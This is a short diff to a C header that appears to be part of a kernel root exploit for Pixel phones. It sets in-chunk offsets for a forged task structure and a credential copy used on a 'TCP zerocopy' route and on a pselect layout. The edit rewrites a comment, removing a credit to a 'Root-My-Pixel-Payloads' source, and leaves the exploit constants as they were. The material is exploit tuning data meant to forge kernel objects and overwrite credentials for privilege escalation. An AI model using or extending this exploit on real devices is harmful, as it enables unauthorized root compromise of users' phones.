@@ -104,13 +104,9 @@
 /* W2 payload. */
 #define CRED_COPY_OFF 0x1080
 
-/* TCP zerocopy route payload geometry (Root-My-Pixel-Payloads src/61/util.c
- * MAIN_TCP_PAYLOAD): chunk bias 0xe80 and delta 0 live in util.c; these
- * are the in-chunk offsets that differ from the pselect layout.
- * fake_task 0x5800 is the value proven by Root-My-Pixel-Payloads (avoids the fake_lock
- * rb_leftmost misalignment). CRED copy moved past it; the pselect
- * 0x1080 slot lands inside the fake_task zone once the chunk bias
- * shifts by 0xe80. */
+/* TCP zerocopy payload offsets: fake_task sits at 0x5800 so it clears the
+ * fake_lock rb_leftmost zone; the cred copy follows because the pselect
+ * 0x1080 slot would land inside fake_task. */
 #define TCP_FAKE_TASK_OFF 0x5800
 #define TCP_CRED_COPY_OFF 0x6800
 
